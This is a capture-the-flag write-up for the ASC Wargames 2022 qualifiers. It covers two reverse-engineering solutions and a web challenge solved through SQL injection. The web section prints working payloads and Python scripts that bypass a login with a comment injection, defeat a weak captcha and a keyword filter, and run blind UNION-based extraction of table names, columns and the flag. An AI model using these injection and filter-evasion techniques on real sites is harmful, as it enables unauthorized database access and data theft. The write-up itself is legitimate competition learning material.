# ASC Wargames 2022 Quals

A CTF Organized by Arab Security Consultants - ASC. This is a qualification phase for the finals which will be held in Egypt. Top 10 teams are qualified to play in the finals.

I played as a member of Soteria Team & together, we secured the first place in this CTF, out of more than 700 teams.

This time, I played a couple of easy Cryptography challenges, Reverse Engineering & Web.

------------

- [Reverse](#Reverse)
    -  [Unpacking 101 - Easy](#rev1 "Writeup")
	-  [PE Anatomy - Medium](#rev2 "Writeup")

- [Web](#web)
	-  [Kenzy - Hard](#web1 "Writeup")

------------

### Reverse
1. <p name="rev1">Unpacking 101 - Easy</p>
For this one, we were given a packed PE. To avoid the packing, we can run the PE file & using [Process-Dump](https://github.com/glmcdona/Process-Dump) we can dump the unpacked executable & reverse it. The flag is stored in the dumped binary after being XORed with 0x55555555.

Solver:

```python
local_74 = [0 for _ in range(14)]

xor_c = 0x55555555

local_74[0] = 0x2160614
local_74[1] = 0x61182e12
local_74[2] = 0x0a640a2c
local_74[3] = 0x61661936
local_74[4] = 0x652c0a27
local_74[5] = 0x260a2720
local_74[6] = 0x66216119
local_74[7] = 0x313b610a
local_74[8] = 0x2564220a
local_74[9] = 0x652c0a66
local_74[10] = 0x360a2720
local_74[11] = 0x36263b65
local_74[12] = 0x363b6664
local_74[13] = 0x00002866

flag = b""
for c in local_74:
    flag += bytes.fromhex(hex(c^xor_c)[2:])[::-1]

print(flag) # ASCWG{M4y_1_cL34r_y0ur_sL4t3_4nd_w1p3_y0ur_c0nsc13nc3}
```

<br />

2. <p name="rev2">PE Anatomy - Medium</p>
So basically this challenge was all about debuging. We were given a binary file & a PE file. Looking as a start at the decompiled code:

```c
hFile = CreateFileA("Dont_run.bin",0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
...
pbData = (short *)VirtualAlloc((LPVOID)0x0,(ulonglong)DVar4,0x3000,4);
BVar5 = ReadFile(hFile,pbData,DVar4,lpNumberOfBytesRead,(LPOVERLAPPED)0x0);
```

We start by reading the content of the binary file, after that, we can see a lot of nested if statements, each verifying a certain condition:
```c
  if (*pbData == 0x5a4d) {
    iVar2 = *(int *)(pbData + 0x1e);
    if (*(short *)((longlong)pbData + (longlong)iVar2 + 4) == 0x1337) {
      for (local_f8 = 0; local_f8 != 5; local_f8 = local_f8 + 1) {
      }
      if (*(int *)((longlong)pbData + (longlong)iVar2 + 8) == 0x65617379) {
        for (local_128 = 0; local_128 != 5; local_128 = local_128 + 1) {
        }
        if (*(int *)((longlong)pbData + (longlong)iVar2 + 0xc) == 0x6767) {
          for (local_120 = 0; local_120 != 5; local_120 = local_120 + 1) {
          }
          if (*(int *)((longlong)pbData + (longlong)iVar2 + 0x10) == 0x657a) {
            for (local_118 = 0; local_118 != 5; local_118 = local_118 + 1) {
            }
            if (*(short *)((longlong)pbData + (longlong)iVar2 + 0x16) == 0x6e6f) {
              for (local_110 = 0; local_110 != 5; local_110 = local_110 + 1) {
              }
	      ...
```

We can ignore the for loops after the if statements. At the end of the nested if checks, we can see the binary calculating our flag with a hash function, which should be the hash of the binary file.

Going through the conditions, we see that the PE is simply checking for specific indexes in the binary file & comparing their values. We got to verify those checks to get our correct flag.

One way to go with this, we can run the PE with a debuger & dynamically debug the program, find the offsets we are requried to change & make a python script to handle those updates.

Solver:

```python
with open('Dont_run.bin.bkup', 'rb') as f:
    data = list(f.read())

def Hex(l):
    return b''.join([bytes.fromhex(hex(x)[2:].rjust(2, '0')) for x in l])[::-1].hex()

def lilInd(x, size):
    return list(bytes.fromhex(hex(x)[2:].rjust(size*2, '0'))[::-1])

print(Hex(data[:2]))

data[100+30+2:100+30+2+2] = lilInd(0x1337, 2)
print(Hex(data[100+30+2:100+30+2+2]))

data[136:140] = lilInd(0x65617379, 4)
print(Hex(data[136:140]))

data[98+30+0xc:98+30+0xc+4] = lilInd(0x6767, 4)
print(Hex(data[98+30+0xc:98+30+0xc+4]))

data[98+30+0xc:98+30+0xc+4] = lilInd(0x6767, 4)
print(Hex(data[98+30+0xc:98+30+0xc+4]))

data[98+30+0x10:98+30+0x10+4] = lilInd(0x657a, 4)
print(Hex(data[98+30+0x10:98+30+0x10+4]))

data[98+30+0x16:98+30+0x16+2] = lilInd(0x6e6f, 2)
print(Hex(data[98+30+0x16:98+30+0x16+2]))

data[98+30+0x18:98+30+0x18+2] = lilInd(0x9999, 2)
print(Hex(data[98+30+0x18:98+30+0x18+2]))

data[98+30+0x28:98+30+0x28+4] = lilInd(0x6969, 4)
print(Hex(data[98+30+0x28:98+30+0x28+4]))

data[98+30+0x30:98+30+0x30+8] = lilInd(0x4142434461626364, 8)
print(Hex(data[98+30+0x30:98+30+0x30+8]))

data[0x188:0x188+5] = lilInd(0x6161616161, 5)
print(Hex(data[0x188:0x188+5]))

data[0x1b0:5+0x1b0] = lilInd(0x6262626262, 5)
print(Hex(data[0x1b0:5+0x1b0]))

data[0x1d8:0x1d8+6] = lilInd(0x64697a656f6a, 6)
print(Hex(data[0x1d8:0x1d8+6]))

data = b''.join([bytes.fromhex(hex(x)[2:].rjust(2, '0')) for x in data])

with open('out', 'wb') as f:
    f.write(data)
```

<br/>

### Web
1. <p name="web1">Kenzy - Hard</p>
We were given the following website:

<p align="center">
    <img width="70%" src='/2022/ASC%20Wargames%202022%20Quals/img/web_home.png'>
</p>

Providing a random password for the admin gives the following:

```
{"Username":"admin","status":"Invalid username or password"}
```

So as a start, we go for a basic SQL Injection. We use `admin' #` for the username & provide anything for the password field to bypass fields verification. We get a successful login:

<p align="center">
    <img src='/2022/ASC%20Wargames%202022%20Quals/img/web_login.png'>
</p>

So, there is something hidden somewhere in the database... Even the home page after logging in doesn't have any kind of access verification & we are simply being redirected to a file `kenzy_admin-panel.php`. We can use this as an oracle to extract information from the database.

Now we have the following problems:
- What do we extract?
- SQLMap isn't useable due to the captcha. (I learnt later on that it's possible to use pre-process, could've been easier.)

Going back to the challenge description, it mentioned a weak captcha so we might be able to bypass it & automate the extraction process.

We download a captcha picture ([Ref](/2022/ASC%20Wargames%202022%20Quals/sources/captcha.php.jpeg)) & we check the content of it, starting with `strings`:

<p align="center">
    <img width='70%' src='/2022/ASC%20Wargames%202022%20Quals/img/captcha_str.png'>
</p>

We see a double base-64 encoded string at the end of the file, decoding it gives us the captcha key.

With this in our hand, we can write a script to get the captcha value then send an SQL injection payload:

```python
import requests

def sendPayload(username, password):
    with requests.Session() as sess:
        resp = sess.get('http://34.175.249.72:60001/scripts/captcha.php')
        captcha = resp.content[-13:-1]
        captcha = base64.b64decode(base64.b64decode(captcha))
        
        resp = sess.post(
            "http://34.175.249.72:60001/index.php",
            data={
                "username":username,
                "password":password,
                "captcha":captcha,
                "send":"Send"
            }
        )
        if b"Invalid username or password" in resp.content:
            return 0
        
        if b"Treasures are always in the database" in resp.content:
            return 1
        
        print(resp.content)
        return 2
```

Now, we can automate! As a start, we can use the `SELECT FROM UNION SELECT` syntax to help us in querying the database, but before that, we need to determin the number of columns the first query is selecting in order to make an `UNION`. To determin that, we can use the following script:

```python
for i in range(1, 50):
    args = ['NULL' for i in range(i)]
    args = ','.join(args)
    if sendPayload("'OR 1=1 UNION SELECT "+args+" #", 'd') == 1:
        print(i)
        break
```

Running this will result in getting a `statement error`. In the error, we can see that:

* Spaces are removed from our input.
* `OR` is being removed. (Later on, we'll figure out that `AND` is being removed too.)

To bypass this, we can simply use `/**/` to replace space & `OOR` and `AANDND` to bypass the keywords filter (Luckly they are replaced only once).

We update our `sendPayload` code to the following:

```python
def sendPayload(username, password):
    username = username.replace(' ', '/**/').replace('OR', 'OORR').replace('or', 'oorr').replace('AND', 'AANDND').replace('and', 'anandd')
    
    with requests.Session() as sess:
        resp = sess.get('http://34.175.249.72:60001/scripts/captcha.php')
        captcha = resp.content[-13:-1]
        captcha = base64.b64decode(base64.b64decode(captcha))
        
        resp = sess.post(
            "http://34.175.249.72:60001/index.php",
            data={
                "username":username,
                "password":password,
                "captcha":captcha,
                "send":"Send"
            }
        )
        if b"Invalid username or password" in resp.content:
            return 0
        
        if b"Treasures are always in the database" in resp.content:
            return 1
        
        if b"statement error" in resp.content:
            print(resp.content)
            return 2
```

And now, we can run our queries without worrying about filters. Re-running the following code to get the number of columns being queried:

```python
for i in range(1, 50):
    args = ['NULL' for i in range(i)]
    args = ','.join(args)
    if sendPayload("'OR 1=1 UNION SELECT "+args+" #", 'd') == 1:
        print(i)
        break
```

Gives us 5.

Now it's time to dump the tables! I wrote a simple script to find all the names of the tables:

```python
tables = [''] # Incomplete table names
total = []  # Complete table names

# Find the possible characters that can be added to the table name tables[0]. If no new characters were found, means the name is complete & can be inserted in total else update tables list.
while len(tables) != 0:
    table = tables[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables where table_name like '"+table+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del tables[0]
        for poss in possibles:
            tables.append(table+poss)
        if len(possibles) == 0:
            total.append(table)
    else:
        tables[0] = table + possibles[0]
    
    print('tables:', tables)
    print('total:', total)
```

This took a while to run since it's dumping everything. When it's done, we got the following list:

```python
['accounts', 'users', 'objects', 'keyring', 'waits', 'x', 'binary', 'error', 'events', 'engine', 'replication', 'role', 'rwlock', 'io', 'innodb', 'password', 'plugin', 'ps', 'sys', 'schema', 'data', 'default', 'db', 'func', 'file', 'general', 'gtid', 'global', 'help', 'hosts', 'latest', 'log', 'mutex', 'component', 'columns', 'cond', 'variables', 'version', 'performance', 'persisted', 'prepared', 'servers', 'setup', 'session', 'statements', 'status', 'solve', 'socket', 'slave', 'slow', 'memory', 'proxies', 'metadata', 'metrics', 'processlist', 'procs']
```

A lot of configuration tables... We can ignore those. What's interesting are these tables:

```python
['accounts', 'users', 'log', 'solve']
```

I thought if nothing worked, we might find something in the logs.

Now, I edited that script to dump the columns of a specified table. 

```python
cols = ['']
total_cols = []
table_name = ''
while len(tables) != 0:
    col = cols[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT column_name, NULL, NULL, NULL, NULL FROM information_schema.columns where table_name='"+table_name+"' and column_name like '"+col+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del cols[0]
        for poss in possibles:
            cols.append(col+poss)
        if len(possibles) == 0:
            total_cols.append(col)
    else:
        cols[0] = col + possibles[0]
    
    print(cols)
    print('total', total_cols)
```

Going through the tables we had above, we get the following:

* accounts: 'total', 'user', 'host', 'current'
* users: 'email', 'total', 'username', 'password', 'position', 'current', 'company'
* solve: 'flag'

It's clear where we'll be heading now, We dump the solve table.

We can make use of the ascii function to avoid lower/upper case problems. Also it helped me to find some symbols being used in the flag.

Code:

```python
rows = [""]
total_rows = []

while len(rows) != 0:
    row = rows[0]
    possibles = []
    for c in "$#_{-}?!:;-*/+@AZERTYUIOPMLKJHGFDSQWXCVBNazertyuiopmlkjhgfdsqwxcvbn0123456789.,":
        if 1 == sendPayload("' UNION SELECT flag, NULL, NULL, NULL, NULL FROM solve where ASCII(substr(flag,"+str(1+len(rows[0]))+",1)) = ascii('"+c+"') LIMIT 1#", 'd'):
            possibles.append(c)
            break # Only 1 row so don't bother
    
    if len(possibles) != 1:
        del rows[0]
        for poss in possibles:
            rows.append(row+poss)
        if len(possibles) == 0:
            total_rows.append(row)
    else:
        rows[0] = row + possibles[0]
    
    print('rows:', rows)
    print('total:', total_rows)
```

And this gives us: `ASCWG{23fsdc$@#EAScasq12_hard}`

The full script used can be found [here](/2022/ASC%20Wargames%202022%20Quals/sources/solver.py)
